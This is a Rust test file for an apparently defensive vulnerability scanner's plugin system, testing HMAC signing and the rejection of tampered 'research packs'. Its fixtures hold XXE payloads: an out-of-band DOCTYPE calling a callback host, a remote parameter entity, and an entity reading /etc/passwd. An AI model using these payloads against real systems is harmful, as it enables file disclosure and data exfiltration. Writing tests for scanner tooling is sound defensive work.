use chrono::Utc;
use sentinel_common::enums::{HttpMethod, Severity};
use sentinel_plugin::{
    DefaultResearchPackManager, PackProbeDefinition, ResearchPack, ResearchPackCheck,
    ResearchPackDictionary, ResearchPackManifest, ResearchPackVerifier,
};

#[test]
fn test_hmac_sha256_rfc2104_key_lengths() {
    let message = b"canonical_digest_to_sign_sentinel";

    // 1. Short key (< 64 bytes)
    let short_key = b"short_secret";
    let mac1 = ResearchPackVerifier::hmac_sha256(short_key, message);
    assert_eq!(mac1.len(), 64); // 32 bytes hex encoded = 64 characters

    // 2. Exactly 64-byte key
    let exact_64_key = vec![0x42u8; 64];
    let mac2 = ResearchPackVerifier::hmac_sha256(&exact_64_key, message);
    assert_eq!(mac2.len(), 64);
    assert_ne!(mac1, mac2);

    // 3. Long key (> 64 bytes) - requires SHA-256 pre-hashing per RFC 2104
    let long_key = vec![0x55u8; 128];
    let mac3 = ResearchPackVerifier::hmac_sha256(&long_key, message);
    assert_eq!(mac3.len(), 64);
    assert_ne!(mac2, mac3);
}

#[test]
fn test_tampering_detection_matrix() {
    let secret = b"sentinel-pack-signature-key-2026";

    let manifest = ResearchPackManifest {
        pack_id: "pack_xxe_advanced".to_string(),
        name: "Advanced XXE Injection Pack".to_string(),
        version: "3.0.1".to_string(),
        author: "SENTINEL Labs".to_string(),
        min_sentinel_version: "6.0.0".to_string(),
        created_at: Utc::now(),
        signature_algorithm: String::new(),
        signature: String::new(),
    };

    let check = ResearchPackCheck {
        check_id: "XXE-BLIND-OOB".to_string(),
        name: "Blind Out-of-Band XXE".to_string(),
        category: "XXE".to_string(),
        severity: Severity::Critical,
        confidence: 0.98,
        cwe: Some(611),
        remediation: "Disable DTD and external entities in XML parser".to_string(),
        probes: vec![PackProbeDefinition {
            probe_id: "probe_xxe_oob".to_string(),
            http_method: HttpMethod::POST,
            path_suffix: "/xml/upload".to_string(),
            payload: "<!DOCTYPE foo SYSTEM 'http://oast.target/xxe'>".to_string(),
            insertion_point: "Body".to_string(),
            expected_indicator: "OAST_CALLBACK".to_string(),
        }],
    };

    let dictionary = ResearchPackDictionary {
        name: "xxe_payload_list".to_string(),
        category: "Payload".to_string(),
        entries: vec![
            "<!ENTITY % dtd SYSTEM 'http://oast/x'>".to_string(),
            "<!ENTITY test SYSTEM 'file:///etc/passwd'>".to_string(),
        ],
    };

    let mut base_pack = ResearchPack {
        manifest,
        checks: vec![check],
        dictionaries: vec![dictionary],
    };

    // Sign pack
    ResearchPackVerifier::sign_pack(&mut base_pack, secret);
    assert!(ResearchPackVerifier::verify_pack(&base_pack, secret).unwrap());

    // Tamper 1: Modify pack_id in manifest
    let mut tampered = base_pack.clone();
    tampered.manifest.pack_id = "pack_xxe_spoofed".to_string();
    assert!(ResearchPackVerifier::verify_pack(&tampered, secret).is_err());

    // Tamper 2: Modify version in manifest
    let mut tampered = base_pack.clone();
    tampered.manifest.version = "3.0.2".to_string();
    assert!(ResearchPackVerifier::verify_pack(&tampered, secret).is_err());

    // Tamper 3: Modify check severity
    let mut tampered = base_pack.clone();
    tampered.checks[0].severity = Severity::Low;
    assert!(ResearchPackVerifier::verify_pack(&tampered, secret).is_err());

    // Tamper 4: Modify check probe payload
    let mut tampered = base_pack.clone();
    tampered.checks[0].probes[0].payload = "malicious altered payload".to_string();
    assert!(ResearchPackVerifier::verify_pack(&tampered, secret).is_err());

    // Tamper 5: Add dictionary entry
    let mut tampered = base_pack.clone();
    tampered.dictionaries[0].entries.push("injected_dict_entry".to_string());
    assert!(ResearchPackVerifier::verify_pack(&tampered, secret).is_err());

    // Tamper 6: Corrupt signature hex string
    let mut tampered = base_pack.clone();
    tampered.manifest.signature = "0000000000000000000000000000000000000000000000000000000000000000".to_string();
    assert!(ResearchPackVerifier::verify_pack(&tampered, secret).is_err());

    // Tamper 7: Empty signature
    let mut tampered = base_pack.clone();
    tampered.manifest.signature = String::new();
    assert!(ResearchPackVerifier::verify_pack(&tampered, secret).is_err());
}

#[test]
fn test_default_research_pack_manager_tampered_rejection() {
    let secret = b"sentinel-manager-secret-key-32b";
    let manager = DefaultResearchPackManager::with_secret(secret);

    let manifest = ResearchPackManifest {
        pack_id: "pack_ssrf_cloud".to_string(),
        name: "SSRF Cloud Metadata Pack".to_string(),
        version: "1.0.0".to_string(),
        author: "SENTINEL".to_string(),
        min_sentinel_version: "6.0.0".to_string(),
        created_at: Utc::now(),
        signature_algorithm: String::new(),
        signature: String::new(),
    };

    let mut pack = ResearchPack {
        manifest,
        checks: vec![],
        dictionaries: vec![],
    };

    ResearchPackVerifier::sign_pack(&mut pack, secret);

    // Tamper before register
    pack.checks.push(ResearchPackCheck {
        check_id: "UNAUTHORIZED_CHECK".to_string(),
        name: "Injected check".to_string(),
        category: "SSRF".to_string(),
        severity: Severity::High,
        confidence: 1.0,
        cwe: None,
        remediation: "None".to_string(),
        probes: vec![],
    });

    let res = manager.register_signed_pack(pack);
    assert!(res.is_err());
}
